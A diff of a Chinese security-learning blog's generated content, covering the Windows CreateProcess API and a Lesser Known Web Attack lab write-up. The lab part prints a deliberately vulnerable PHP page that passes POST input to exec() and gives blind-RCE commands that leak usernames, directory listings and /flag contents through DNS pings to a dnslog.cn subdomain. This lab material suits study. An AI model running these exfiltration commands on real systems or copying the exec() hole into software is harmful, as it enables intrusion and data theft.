@@ -132,34 +132,24 @@
     <content><![CDATA[<h2 id="进程启动"><a href="#进程启动" class="headerlink" title="进程启动"></a>进程启动</h2><h3 id="CreateProcess"><a href="#CreateProcess" class="headerlink" title="CreateProcess"></a>CreateProcess</h3><p>函数在<strong>processthreadsapi.h</strong>中声明。</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateProcessA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPCSTR                lpApplicationName,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out, optional] LPSTR                 lpCommandLine,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                BOOL                  bInheritHandles,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                DWORD                 dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPVOID                lpEnvironment,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPCSTR                lpCurrentDirectory,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                LPSTARTUPINFOA        lpStartupInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]               LPPROCESS_INFORMATION lpProcessInformation</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
 
+<span id="more"></span>
+
 <ul>
-<li><p>lpApplicationName：要执行的模块的名称。为NULL则是lpCommandLine中第一个空格分隔的标记。</p>
-</li>
-<li><p>lpCommandLine：要执行的命令行。</p>
-</li>
-<li><p>lpProcessAttributes：指向 SECURITY_ATTRIBUTES 结构（确定子进程是否可以继承新进程对象的返回句柄）的指针。可以为NULL。</p>
-</li>
-<li><p>lpThreadAttributes：基本同lpProcessAttributes。</p>
-</li>
-<li><p>bInheritHandles：TRUE则调用进程中的每个可继承句柄都由新进程继承。</p>
-</li>
-<li><p>dwCreationFlags：控制优先级类和进程的创建的标志。</p>
-<ul>
+<li>lpApplicationName：要执行的模块的名称。为NULL则是lpCommandLine中第一个空格分隔的标记。</li>
+<li>lpCommandLine：要执行的命令行。</li>
+<li>lpProcessAttributes：指向 SECURITY_ATTRIBUTES 结构（确定子进程是否可以继承新进程对象的返回句柄）的指针。可以为NULL。</li>
+<li>lpThreadAttributes：基本同lpProcessAttributes。</li>
+<li>bInheritHandles：TRUE则调用进程中的每个可继承句柄都由新进程继承。</li>
+<li>dwCreationFlags：控制优先级类和进程的创建的标志。<ul>
 <li>CREATE_NEW_CONSOLE：新进程有一个新的控制台，而不是继承其父进程的控制台（默认）。</li>
 <li>CREATE_NO_WINDOW：该进程是一个在没有控制台窗口的情况下运行的控制台应用程序。</li>
 </ul>
 </li>
-<li><p>lpEnvironment：指向新进程的环境块的指针。 如果此参数为NULL，则新进程将使用调用进程的环境。</p>
-</li>
-<li><p>lpCurrentDirectory：进程当前目录的完整路径。如果此参数为 NULL，则新进程将具有与调用进程相同的当前驱动器和目录。</p>
-</li>
-<li><p>lpStartupInfo：指向 STARTUPINFO 或 STARTUPINFOEX 结构的指针。</p>
-</li>
-<li><p>lpProcessInformation：指向接收有关新进程的标识信息的 PROCESS_INFORMATION 结构的指针。</p>
-</li>
+<li>lpEnvironment：指向新进程的环境块的指针。 如果此参数为NULL，则新进程将使用调用进程的环境。</li>
+<li>lpCurrentDirectory：进程当前目录的完整路径。如果此参数为 NULL，则新进程将具有与调用进程相同的当前驱动器和目录。</li>
+<li>lpStartupInfo：指向 STARTUPINFO 或 STARTUPINFOEX 结构的指针。</li>
+<li>lpProcessInformation：指向接收有关新进程的标识信息的 PROCESS_INFORMATION 结构的指针。</li>
 </ul>
-<span id="more"></span>
-
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    STARTUPINFO si = &#123; <span class="built_in">sizeof</span>(si) &#125;;</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line">    <span class="type">wchar_t</span> cmdLine[] = <span class="string">L&quot;calc&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CreateProcess</span>(<span class="literal">NULL</span>, cmdLine, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">false</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h3 id="WinExec"><a href="#WinExec" class="headerlink" title="WinExec"></a>WinExec</h3><p>函数在<strong>winbase.h</strong>中声明。</p>
@@ -4282,11 +4272,11 @@
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>项目地址：<a href="https://github.com/weev3/LKWA">weev3&#x2F;LKWA: Lesser Known Web Attack Lab (github.com)</a></p>
 <h2 id="Blind-RCE"><a href="#Blind-RCE" class="headerlink" title="Blind RCE"></a>Blind RCE</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;sidebar.php&quot;</span>);</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Blind RCE</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rce</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user_input</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$level</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user_input = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user_input&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;user_input&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;level = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;level&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;level&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;user_input)) &#123;</span><br><span class="line">       </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        		<span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;user_input);		</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rce</span> = <span class="keyword">new</span> <span class="title class_">Rce</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$rce</span>-&gt;<span class="title function_ invoke__">start</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<span id="more"></span>
+
 <p>没有echo，也就没有回显，只是执行。</p>
 <p>利用 dnslog 回显的特点，一个免费的网站：<a href="http://www.dnslog.cn/">DNSLog Platform</a>。点击首先获取一个 SubDomain。</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ping `whoami`.9et4ix.dnslog.cn</span><br><span class="line"><span class="meta prompt_">-&gt; </span><span class="language-bash">ping admin.9et4ix.dnslog.cn</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">windows</span></span><br><span class="line">ping %USERNAME%.9et4ix.dnslog.cn</span><br><span class="line"></span><br><span class="line">ls / | awk -F &#x27; &#x27; &#x27;&#123;system(&quot;ping -c 2 &quot;NR&quot;.9et4ix.dnslog.cn&quot;)&#125;&#x27;		# 查看根目录文件数</span><br><span class="line">ls / | awk -F&#x27; &#x27; &#x27;NR==1&#123;system(&quot;ping -c 1 &quot;$0&quot;.9et4ix.dnslog.cn&quot;)&#125;&#x27;		# 查看根目录的第一个文件</span><br><span class="line">ping -c 1 `cat /flag`.9et4ix.dnslog.cn</span><br></pre></td></tr></table></figure>
-
-<span id="more"></span>
 
 <h2 id="XSSI"><a href="#XSSI" class="headerlink" title="XSSI"></a>XSSI</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// xssi.php</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $.<span class="title function_ invoke__">ajax</span>(		// 向服务器中发送异步 HTTP 请求</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">url</span>:<span class="string">&quot;../api/user&quot;</span>,</span><br><span class="line">            <span class="attr">type</span>:<span class="string">&quot;GET&quot;</span>,</span><br><span class="line">            <span class="attr">async</span>:<span class="literal">true</span>,			// 异步请求</span><br><span class="line">            <span class="attr">success</span>:function(parse)&#123;		<span class="comment">// 定义一个成功的回调函数，在服务器成功返回数据后被调用</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> i in parse)&#123;		<span class="comment">// 回调函数首先遍历服务器返回的数据对象 parse 中的所有属性和值</span></span><br><span class="line">                    <span class="comment">// 对于每个属性名 i，通过 $() 方法选取对应的 HTML 元素，并设置其文本内容为该属性的值</span></span><br><span class="line">                    $(<span class="string">&quot;#&quot;</span> + i).<span class="title function_ invoke__">text</span>(parse[i]); </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">get</span>();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
